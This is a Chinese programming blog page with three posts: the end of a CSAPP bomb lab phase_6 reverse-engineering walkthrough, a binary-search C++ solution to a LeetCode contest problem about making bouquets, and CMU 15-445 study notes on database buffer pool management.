class="line">  401138:	8b 04 84             	mov    (%rsp,%rax,4),%eax</span><br><span class="line">  40113b:	39 45 00             	cmp    %eax,0x0(%rbp)</span><br><span class="line">  40113e:	75 05                	jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:	e8 f5 02 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:	83 c3 01             	add    $0x1,%ebx</span><br><span class="line">  401148:	83 fb 05             	cmp    $0x5,%ebx</span><br><span class="line">  40114b:	7e e8                	jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:	49 83 c5 04          	add    $0x4,%r13</span><br><span class="line">  401151:	eb c1                	jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line">  ;循环判断，要求每一个数与其他数互不相等</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">401153:	48 8d 74 24 18       	lea    0x18(%rsp),%rsi</span><br><span class="line">401158:	4c 89 f0             	mov    %r14,%rax</span><br><span class="line">40115b:	b9 07 00 00 00       	mov    $0x7,%ecx</span><br><span class="line">401160:	89 ca                	mov    %ecx,%edx</span><br><span class="line">401162:	2b 10                	sub    (%rax),%edx</span><br><span class="line">401164:	89 10                	mov    %edx,(%rax)</span><br><span class="line">401166:	48 83 c0 04          	add    $0x4,%rax</span><br><span class="line">40116a:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">40116d:	75 f1                	jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line">40116f:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">401174:	eb 21                	jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">;对于每一个数x，将其转换为7-x</span><br></pre></td></tr></table></figure>



<p>以我的水平只能翻译到这里，后面的访存，跳转操作实在太绕了，我思路完全理不清，所以参考了网上一些大佬的文章，看了看思路，最后勉强理解的整体流程。</p>
<p>下面是后续部分的代码解析（参考:<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28422249%EF%BC%89">https://zhuanlan.zhihu.com/p/28422249）</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">401176:	48 8b 52 08          	mov    0x8(%rdx),%rdx</span><br><span class="line">40117a:	83 c0 01             	add    $0x1,%eax</span><br><span class="line">40117d:	39 c8                	cmp    %ecx,%eax</span><br><span class="line">40117f:	75 f5                	jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">401181:	eb 05                	jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">401183:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">401188:	48 89 54 74 20       	mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">40118d:	48 83 c6 04          	add    $0x4,%rsi</span><br><span class="line">401191:	48 83 fe 18          	cmp    $0x18,%rsi</span><br><span class="line">401195:	74 14                	je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line"></span><br><span class="line">401197:	8b 0c 34             	mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">40119a:	83 f9 01             	cmp    $0x1,%ecx</span><br><span class="line">40119d:	7e e4                	jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">40119f:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">4011a4:	ba d0 32 60 00       	mov    $0x6032d0,%edx</span><br><span class="line">4011a9:	eb cb                	jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">;将6个数一一做判断，对于第i个数（从0开始）,根据它的大小不同，将不同数存入(rsp+20+8i)中。</span><br><span class="line">;具体映射情况如下</span><br><span class="line">;1-&gt;0x6032d0</span><br><span class="line">;2-&gt;0x6032e0</span><br><span class="line">;3-&gt;0x6032f0</span><br><span class="line">;4-&gt;0x603300</span><br><span class="line">;5-&gt;0x603310</span><br><span class="line">;6-&gt;0x603320</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">4011ab:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx</span><br><span class="line">4011b0:	48 8d 44 24 28       	lea    0x28(%rsp),%rax</span><br><span class="line">4011b5:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi</span><br><span class="line">4011ba:	48 89 d9             	mov    %rbx,%rcx</span><br><span class="line">4011bd:	48 8b 10             	mov    (%rax),%rdx</span><br><span class="line">4011c0:	48 89 51 08          	mov    %rdx,0x8(%rcx)</span><br><span class="line">4011c4:	48 83 c0 08          	add    $0x8,%rax</span><br><span class="line">4011c8:	48 39 f0             	cmp    %rsi,%rax</span><br><span class="line">4011cb:	74 05                	je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">4011cd:	48 89 d1             	mov    %rdx,%rcx</span><br><span class="line">4011d0:	eb eb                	jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line">4011d2:	48 c7 42 08 00 00 00 	movq   $0x0,0x8(%rdx)</span><br><span class="line">4011d9:	00 </span><br><span class="line">;这一段代码将我们刚刚存入的(rsp+20)~(rsp+48)六个数字的对应地址进行操作</span><br><span class="line">;假设(rsp+0x20)&#x3D;x,则(x+8)&#x3D;(rsp+0x28)</span><br><span class="line">;依次类推（rsp+n)&#x3D;y,则(y+8)&#x3D;(rsp+n+8)，其中0x20&lt;&#x3D;n&lt;&#x3D;0x48</span><br><span class="line"></span><br><span class="line">;而对于(rsp+0x50)而言，若(rsp+0x50)&#x3D;z,则（z+8)&#x3D;0</span><br></pre></td></tr></table></figure>

<p>文字描述:</p>
<p>栈顶的值为地址+8后寻址到的值为栈里第二个值，第二个值为地址+8后寻址到的值为栈里第三个 值，以此类推，栈里第六个值为地址+8后寻址到的是0.</p>
<p>最后这两段的代码建议自己画图跟着流程走一遍，不然容易被绕晕。</p>
<p>最后一段代码是对上面这段代码执行结果的检验。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">4011da:	bd 05 00 00 00       	mov    $0x5,%ebp</span><br><span class="line">4011df:	48 8b 43 08          	mov    0x8(%rbx),%rax</span><br><span class="line">4011e3:	8b 00                	mov    (%rax),%eax</span><br><span class="line">4011e5:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">4011e7:	7d 05                	jge    4011ee &lt;phase_6+0xfa&gt;</span><br><span class="line">4011e9:	e8 4c 02 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">4011ee:	48 8b 5b 08          	mov    0x8(%rbx),%rbx</span><br><span class="line">4011f2:	83 ed 01             	sub    $0x1,%ebp</span><br><span class="line">4011f5:	75 e8                	jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">4011f7:	48 83 c4 50          	add    $0x50,%rsp</span><br><span class="line">4011fb:	5b                   	pop    %rbx</span><br><span class="line">4011fc:	5d                   	pop    %rbp</span><br><span class="line">4011fd:	41 5c                	pop    %r12</span><br><span class="line">4011ff:	41 5d                	pop    %r13</span><br><span class="line">401201:	41 5e                	pop    %r14</span><br><span class="line">401203:	c3                   	retq   </span><br><span class="line">;做5次循环判断，%rbx初始存的是栈顶的值</span><br><span class="line">;对这个值+8后作为地址寻址到的值再寻址后得到的值，小于这个值自身作为地址寻址到的值，就可以跳过炸弹</span><br><span class="line">;然后对栈里5组关系都要满足才能通关。</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//对最后一段汇编代码进行大致的翻译</span></span><br><span class="line"><span class="comment">//rbx初始化为&quot;栈顶的值&quot;(对(rsp+20)访存)</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(*(*(rbx+<span class="number">8</span>))&gt;=*(rbx))</span><br><span class="line">        bomb();</span><br><span class="line">    rbx=*(rbx+<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一段可以理解为输入的六个数翻转后对应的地址中的值，是按照递减顺序排列的（见下图）</p>
<p>6个地址存的值</p>
<table>
<thead>
<tr>
<th align="center">地址</th>
<th align="center">值</th>
<th align="center">翻转后的值(7-x)</th>
<th align="center">输入值(x)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x6032d0</td>
<td align="center">332</td>
<td align="center">1</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">0x6032e0</td>
<td align="center">168</td>
<td align="center">2</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">0x6032f0</td>
<td align="center">924</td>
<td align="center">3</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">0x603300</td>
<td align="center">691</td>
<td align="center">4</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">0x603310</td>
<td align="center">477</td>
<td align="center">5</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">0x603320</td>
<td align="center">443</td>
<td align="center">6</td>
<td align="center">1</td>
</tr>
</tbody></table>
<p>根据要求，我们的输入值的顺序要按照值的大小递减输入，</p>
<p>即phase_6答案为“4 3 2 1 6 5”</p>
<p>程序运行结果:</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/wAGotA"><img src="https://s1.ax1x.com/2020/09/04/wAGotA.png" alt="wAGotA.png"></a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/16/leetcode%E5%91%A8%E8%B5%9B-6-14/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/06/16/leetcode%E5%91%A8%E8%B5%9B-6-14/" class="post-title-link" itemprop="url">Leetcode周赛 6.14</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-06-16 17:21:01" itemprop="dateCreated datePublished" datetime="2020-06-16T17:21:01+08:00">2020-06-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-08-30 12:00:00" itemprop="dateModified" datetime="2020-08-30T12:00:00+08:00">2020-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="5438-制作m束花所需的最少天数"><a href="#5438-制作m束花所需的最少天数" class="headerlink" title="5438.制作m束花所需的最少天数"></a>5438.制作m束花所需的最少天数</h3><p>给你一个整数数组 bloomDay，以及两个整数 m 和 k 。</p>
<p>现需要制作 m 束花。制作花束时，需要使用花园中 <strong>相邻的k朵花</strong> 。</p>
<p>花园中有 n 朵花，第 i朵花会在 bloomDay[i] 时盛开，<strong>恰好</strong> 可以用于 <strong>一束</strong> 花中。</p>
<p>请你返回从花园中摘 m 束花需要等待的最少的天数。如果不能摘到 m 束花则返回 <strong>-1</strong> 。</p>
<p><strong>示例 1：</strong></p>
<p>输入：bloomDay = [1,10,3,10,2], m = 3, k = 1<br>输出：3<br>解释：让我们一起观察这三天的花开过程，x 表示花开，而 _ 表示花还未开。<br>现在需要制作 3 束花，每束只需要 1 朵。<br>1 天后：[x, _, _, _, _]   // 只能制作 1 束花<br>2 天后：[x, _, _, _, x]   // 只能制作 2 束花<br>3 天后：[x, _, x, _, x]   // 可以制作 3 束花，答案为 3</p>
<p><strong>示例 2：</strong></p>
<p>输入：bloomDay = [1,10,3,10,2], m = 3, k = 2<br>输出：-1<br>解释：要制作 3 束花，每束需要 2 朵花，也就是一共需要 6 朵花。而花园中只有 5 朵花，无法满足制作要求，返回 -1 。</p>
<p><strong>示例 3：</strong></p>
<p>输入：bloomDay = [7,7,7,7,12,7,7], m = 2, k = 3<br>输出：12<br>解释：要制作 2 束花，每束需要 3 朵。<br>花园在 7 天后和 12 天后的情况如下：<br>7 天后：[x, x, x, x, _, x, x]<br>可以用前 3 朵盛开的花制作第一束花。但不能使用后 3 朵盛开的花，因为它们不相邻。<br>12 天后：[x, x, x, x, x, x, x]<br>显然，我们可以用不同的方式制作两束花。</p>
<p><strong>示例 4：</strong></p>
<p>输入：bloomDay = [1000000000,1000000000], m = 1, k = 1<br>输出：1000000000<br>解释：需要等 1000000000 天才能采到花来制作花束</p>
<p><strong>示例 5：</strong></p>
<p>输入：bloomDay = [1,10,2,9,3,8,4,7,5,6], m = 4, k = 2<br>输出：9</p>
<p><strong>提示：</strong></p>
<ul>
<li>bloomDay.length == n</li>
<li>1&lt;=n&lt;=10^5</li>
<li>1&lt;=bloomDay[i]&lt;=10^9</li>
<li>1&lt;=m&lt;=10^6</li>
<li>1&lt;=k&lt;=n</li>
</ul>
<p>思路:</p>
<p>这题真的想了非常久，最简单的想法就是按天数递增，每天判断一次是否满足要求，但是一看数据范围就直到这么简单的暴力必然超时。</p>
<p>然后就想着能不能将bloomDay划分出m个子数组，每个数组含k个元素，最终取出这些子数组内的元素最大值，但是这个思路实现起来很困难，因为m*k&lt;bloomDay.size() （多数情况这个式子是满足的，这样的话我们很难确定划分出的这个子数组是否是正确的。</p>
<p>假设一组数据 bloomDay=[8,7,6,1,1,1,6,7,8] m=2, k=3</p>
<p>我们需要从boolmDay数组中划分出2个子数组，每个子数组含3个元素，那么要怎么划分呢？</p>
<p>直觉上来说应该先划分出[1,1,1]，因为它是最小的</p>
<p>但是这样结果就是[1,1,1]和[8,7,6] 或是[1,1,1]和[6,7,8]这两种组合，最终结果都是8</p>
<p>但这一组数据的正确划分应该是[7,6,1]和[1,1,6]，结果是7</p>
<p>从这个例子可以发现，在划分某个子数组过程中，我们难以判断本次划分是否正确，必须等到我们把全部子数组划分结束后才能得到结果，且这个结果还需要与其他划分方式进行比对，取最小值。</p>
<p>要枚举出所有划分子数组的方法是必然会超时的</p>
<p>所以绕了半天好像还是没有越过超时的坎。</p>
<p>最后我是采用二分的思路解决这题的（大概率不是最优</p>
<p>步骤如下:</p>
<p>1.对天数进行二分处理，初始时minday=1，maxday=1e9 （根据1&lt;=bloomDay[i]&lt;=10^9)</p>
<p>mid=minday+（maxday-minday）/2</p>
<p>2.在每一次二分过程中判断在mid这一天之前盛开的花是否能够满足我们的需求</p>
<p>3.如果花的数量满足需要则maxday=mid，如果不满足需要则minday=mid+1，</p>
<p>4.当minday&gt;=maxday时退出二分循环，这时minday就是我们要找的答案</p>
<p>这种做法其实也是一种暴力，只是通过二分的思路将时间消耗降低到了可接受范围之内时间复杂度，空间复杂度</p>
<p>代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    &#x2F;&#x2F;二分搜索</span><br><span class="line">    int minDays(vector&lt;int&gt;&amp; bloomDay, int m, int k) &#123;</span><br><span class="line">        long long sum&#x3D;m*k;</span><br><span class="line">        int len&#x3D;bloomDay.size();</span><br><span class="line">        if(sum&gt;len) return -1;   &#x2F;&#x2F;m*k&gt;len 花的数量不够</span><br><span class="line">        </span><br><span class="line">        int minday&#x3D;1,maxday&#x3D;1e9;</span><br><span class="line">        while(minday&lt;maxday)&#123;</span><br><span class="line">            int mid&#x3D;minday+(maxday-minday)&#x2F;2;</span><br><span class="line">            int ok&#x3D;false;</span><br><span class="line">            int cal&#x3D;0;</span><br><span class="line">            int tmpm&#x3D;0;</span><br><span class="line">            </span><br><span class="line">            for(int i&#x3D;0;i&lt;len;i++)&#123;  &#x2F;&#x2F;判断这一天是否满足要求</span><br><span class="line">                if(bloomDay[i]&lt;&#x3D;mid)&#123;</span><br><span class="line">                    cal++;</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                    cal&#x3D;0;</span><br><span class="line">                if(cal&#x3D;&#x3D;k)&#123;</span><br><span class="line">                    tmpm++;</span><br><span class="line">                    cal&#x3D;0;</span><br><span class="line">                    if(tmpm&#x3D;&#x3D;m)&#123;   &#x2F;&#x2F;满足要求，提前退出循环</span><br><span class="line">                        ok&#x3D;true;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;   </span><br><span class="line">            </span><br><span class="line">            if(ok)</span><br><span class="line">                maxday&#x3D;mid;</span><br><span class="line">            else</span><br><span class="line">                minday&#x3D;mid+1;</span><br><span class="line">        &#125;</span><br><span class="line">        return minday;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/05/27/cmu15-445-%E7%BC%93%E5%86%B2%E6%B1%A0%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.png">
      <meta itemprop="name" content="wwow">
      <meta itemprop="description" content="努力可能会成功，但不努力真的很舒服">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wwow's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/05/27/cmu15-445-%E7%BC%93%E5%86%B2%E6%B1%A0%E5%92%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/" class="post-title-link" itemprop="url">CMU15-445学习笔记-缓冲池和内存管理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-05-27 23:04:31" itemprop="dateCreated datePublished" datetime="2020-05-27T23:04:31+08:00">2020-05-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-08-30 12:04:08" itemprop="dateModified" datetime="2020-08-30T12:04:08+08:00">2020-08-30</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/cmu15-445/" itemprop="url" rel="index"><span itemprop="name">cmu15-445</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="Bifurcated-environment（分叉环境？）"><a href="#Bifurcated-environment（分叉环境？）" class="headerlink" title="Bifurcated environment（分叉环境？）"></a>Bifurcated environment（分叉环境？）</h3><p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/XJRL5GX_J66T7V_CE9P.png"></p>
<p>以上是目前许多公司的标准配置，它们有前端的OLTP数据库以及后端大型数据仓库，前端的OLTP数据库通常会被称为Data silo（数据孤岛，即相互<strong>独立</strong>的数据存储区），因为我们可以对其中一个数据库实例进行许多更新操作，并将其应用到此处的单个逻辑数据库中（Data silo），但这些前端数据库之间不会互相交流，它们每一个都是独立于其他数据库的一个“孤岛”。</p>
<p>从前端的OLTP数据库中得到数据后，我们会进行一种称为ETL（ETL是将业务系统的数据经过抽取，清洗转换后加载到数据仓库的过程）的操作，然后在数据仓库（OLAP数据库）中对这些数据进行分析，最后将分析得到的新信息再返回给OLTP数据库，通过OLTP数据库将这些新信息向外暴露。</p>
<p>HTAP（上节课提到的一种混合模式的workload）的理念是，让前端的OLTP数据库也能够完成一些原先在OLAP端所做的分析行为。但我们仍然需要后端的大型数据仓库（OLAP），因为前端的OLTP数据库只能根据自己所拥有的数据进行少量分析行为，且由于它们互相之间是“孤岛”，所以我们只能在后端的数据仓库中看到<strong>所有</strong>的OLTP数据库中的数据，并对它们一起进行分析。</p>
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>数据库无法直接在磁盘上进行操作，由于冯诺伊曼架构，我们只能对内存中的数据进行读写，所以这节课我们会学习我们如何将磁盘中的数据库文件或是page放到内存中，以便我们能够对它们进行操作。</p>
<p>我们希望能够去支持超出我们内存容量大小的数据库，同时也希望能够最小化磁盘执行查询速度缓慢带来的影响，我们希望这些操作就像在内存中进行的那样。</p>
<p>我们可以从空间和时间的管理上来思考这个问题。</p>
<h3 id="空间管理"><a href="#空间管理" class="headerlink" title="空间管理"></a>空间管理</h3><p>空间管理是指我们将数据写入在磁盘的什么地方，依照磁盘的特性，我们希望尽可能的将经常使用的page连续的存放，当我们对这些page读写的时候，由于它们的物理位置彼此靠近，我们就无须花费过多时间用于查找它们在磁盘上的位置。</p>
<h3 id="时间管理"><a href="#时间管理" class="headerlink" title="时间管理"></a>时间管理</h3><p>时间管理指我们在什么时候将page读入内存，另一方面，当这些page被修改后，我们也需要将它们写回磁盘，我们需要决定何时执行这些操作。</p>
<p>总而言之，我们希望最小化将数据库存放在磁盘给我们带来的许多负面影响。</p>
<h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/WQE5_JXZ292WJKD6A.png"></p>
<p>前面两节课我们讨论了如何在磁盘中表示数据，现在我们要讨论图中内存中的Buffer Pool这一部分。当上层请求读取page2时，我们会同过page目录找到page2，并将其送入内存。但是我们的内存容量是远小于外存的，必然会出现Buffer Pool已满，但是我们仍然需要向磁盘中读入新的page这种情况。这时我们就需要将一些在Buffer Pool中的page写出，这样就能够有空闲的空间读入新的page。</p>
<p>这就要求我们需要决定对那些page执行写出操作，这是今天这节课的重点讨论内容。</p>
<h3 id="Buffer-Pool管理器"><a href="#Buffer-Pool管理器" class="headerlink" title="Buffer Pool管理器"></a>Buffer Pool管理器</h3><p>Buffer Pool需要系统分配一块很大的内存空间，因此才能够将page从磁盘中读入。但是注意，这一块内存空间是完全由数据库系统来控制的，而不是OS。</p>
<p>我们将这块大的内存空间分成一个个固定大小的chunk，它被称为frame。我们会将从磁盘中读入的一个page放入一个frame中，我个人认为frame是内存中的页框，专门用于装入page。</p>
<p>当数据库请求得到一个page时，Buffer Pool具体做了哪些事呢？</p>
<p>首先是查看Buffer Pool中是否存在这个page，如果存在那就直接将它的指针提交给上层；如果不存在就需要到磁盘中拷贝一份数据放入内存中。这个过程中不会对数据进行任何的序列化处理，数据在磁盘中是怎样的，那么它在内存中就是怎样的。</p>
<h4 id="定位内存中的page"><a href="#定位内存中的page" class="headerlink" title="定位内存中的page"></a>定位内存中的page</h4><p>和在磁盘中遇到的一样，我们如何在内存中找到想要的page的位置呢？</p>
<p><img src="http://119.23.248.105/%22wp-content/uploads%22/2020/05/NWWFU_B_T4QB785_P.png"></p>
<p>我们同样使用一个额外的indirection层来保存一个映射关系，即page表（注意跟磁盘中的page目录做一个区分），page表是一个hash表，通过它来跟踪内存中的page，我们可以根据page表和pageId来定位某个page存放在哪个frame中。</p>
<p>我们需要使用一些元数据来跟踪对于内存中page的操作，这里说以下Dirty Flag和Pin/Reference Counter</p>
<h4 id="Dirty-Flag"><a href="#Dirty-Flag" class="headerlink" title="Dirty Flag"></a>Dirty Flag</h4><p>前面提到，当Buffer Pool满时我们需要换出一些page来将一些内存空间空出来给新的page。那么对于在内存中没有被修改的page，我们可以直接将它丢弃，这不会影响正确性，且减少了I/O操作，提高了性能。但是对于在内存中遭到修改的page，我们必须要将它们写回磁盘中，否则就会造成数据的缺失。</p>
<p>为了确认哪些page在内存中被修改，我们使用Dirty Flag对被修改的page进行一个标记。</p>
<h4 id="Pin-Reference-Counter"><a href="#Pin-Reference-Counter" class="headerlink" title="Pin/Reference Counter"></a>Pin/Reference Counter</h4><p>这个元数据用于追踪使用该page的当前线程数量或是正在查询这个page的线程数，如果当前有线程在使用或查询该page，我们就不应该将它丢弃或是写回磁盘中，这种时候我们可以在page表中为这一项page加一个latch（锁）。</p>
<p>我们还需要额外去做一些事情来跟踪哪些page被修改了，上述两者只是其中的一部分，我们可能还需要追踪时谁修改了page。</p>
<p>上述内容可以很好的解释我们在数据库存储中说到的，为什么不适用OS（mmap）来帮我们进行内存管理？ 因为也许OS会提前将我们仍需要使用的page写出到磁盘中。</p>
<h4 id="Locks-vs-Latchs"><a href="#Locks-vs-Latchs" class="headerlink" title="Locks vs Latchs"></a>Locks vs Latchs</h4><p>为了防止混淆，我们做以下lock和latch的区分。</p>
<p>在数据库中，lock是更高级的逻辑原语，它用于保护数据库中的逻辑内容（如tuple，表，数据库），事务在运行时会持有lock，来支持并发操作同时保证操作的正确性。lock的内容是暴露给开发人员的，我们可以在运行查询时看到持有的是哪种lock。</p>
<p>latch是一种底层保护原语，它用来保护数据库内部的内容，例如保护数据结构和内存区域。在我们执行操作时会持有latch来保护某些东西，例如当我修改page表的内容时，我会在要修改的地方加一个latch，在修改后再将它释放。当我们使用latch时，不需要担心回滚操作。因为它是内部的东西，它会去更新数据库系统的物理数据结构，当我进行修改时，如果没能拿到对应的latch，那我就会终止操作，而不用担心回滚的问题。关于回滚的内容会在后续的并发控制的课上详细说明。</p>
<h4 id="page表-vs-page目录"><a href="#page表-vs-page目录" class="headerlink" title="page表 vs page目录"></a>page表 vs page目录</h4><p>同样的，来区分以下page表和page目录。</p>
<p>page目录的作用是用来找到page在磁盘上的位置。我们对page目录所作的修改都必须持久化，它们必须被写到磁盘中，即使系统崩溃了，在恢复之后我们也能知道从哪里找到我们的page。</p>
<p>page表是内存中的映射，它将pageId映射到它们在Buffer Pool中frame的位置。它是一个暂时的东西，我们无须将它持久化保存在磁盘中。</p>
<h4 id="内存分配策略"><a href="#内存分配策略" class="headerlink" title="内存分配策略"></a>内存分配策略</h4><p><strong>全局策略</strong>中我们所作的策略是对全局有利的，我们会查看所有运行的查询和事务，再决定某个内容是否应该存储在内存中。</p>
<p><strong>局部策略</strong>是针对单个查询或事务来说，我们尝试使用对它有利的分配方式，但这对其他查询和事务来说也许是非常不利的。</p>
<p>这两种策略没有优劣之分，根据实际情况来选择分配策略，在很多时候我们也希望对两种策略做一个折中处理。</p>
